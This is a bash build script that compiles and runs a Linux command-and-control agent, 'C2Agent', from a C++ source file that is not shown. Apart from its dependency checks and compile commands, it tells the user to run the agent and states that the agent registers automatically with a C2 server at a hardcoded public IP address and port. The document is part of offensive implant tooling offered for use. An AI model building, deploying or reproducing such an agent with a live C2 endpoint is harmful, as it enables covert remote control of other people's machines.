#!/bin/bash

echo "Building C2 Agent for Linux..."

# Check if g++ is available
if ! command -v g++ &> /dev/null; then
    echo "Error: g++ compiler not found. Please install build-essential package."
    echo "On Ubuntu/Debian: sudo apt-get install build-essential"
    echo "On CentOS/RHEL: sudo yum groupinstall 'Development Tools'"
    exit 1
fi

# Check if required libraries are available
if ! pkg-config --exists libcurl; then
    echo "Warning: libcurl development package not found."
    echo "On Ubuntu/Debian: sudo apt-get install libcurl4-openssl-dev"
    echo "On CentOS/RHEL: sudo yum install libcurl-devel"
    echo "Attempting to compile without pkg-config..."
    CURL_FLAGS=""
else
    CURL_FLAGS=$(pkg-config --cflags --libs libcurl)
fi

if ! pkg-config --exists jsoncpp; then
    echo "Warning: jsoncpp development package not found."
    echo "On Ubuntu/Debian: sudo apt-get install libjsoncpp-dev"
    echo "On CentOS/RHEL: sudo yum install jsoncpp-devel"
    echo "Attempting to compile without pkg-config..."
    JSON_FLAGS=""
else
    JSON_FLAGS=$(pkg-config --cflags --libs jsoncpp)
fi

# Compile the agent
echo "Compiling C2Agent_Linux.cpp..."

g++ -std=c++17 \
    -O2 \
    -Wall \
    -Wextra \
    C2Agent_Linux.cpp \
    -lcurl \
    -ljsoncpp \
    -lpthread \
    -o C2Agent

if [ $? -eq 0 ]; then
    echo "Build successful! C2Agent executable created."
    echo ""
    echo "To run the agent:"
    echo "  ./C2Agent"
    echo ""
    echo "The agent will automatically register with your C2 server at: http://150.136.130.59:3002"
    echo ""
    echo "Note: You may need to install dependencies if not already installed:"
    echo "  sudo apt-get install libcurl4-openssl-dev libjsoncpp-dev"
else
    echo "Build failed!"
    echo ""
    echo "Common issues and solutions:"
    echo "1. Missing libcurl: sudo apt-get install libcurl4-openssl-dev"
    echo "2. Missing jsoncpp: sudo apt-get install libjsoncpp-dev"
    echo "3. Missing build tools: sudo apt-get install build-essential"
    exit 1
fi 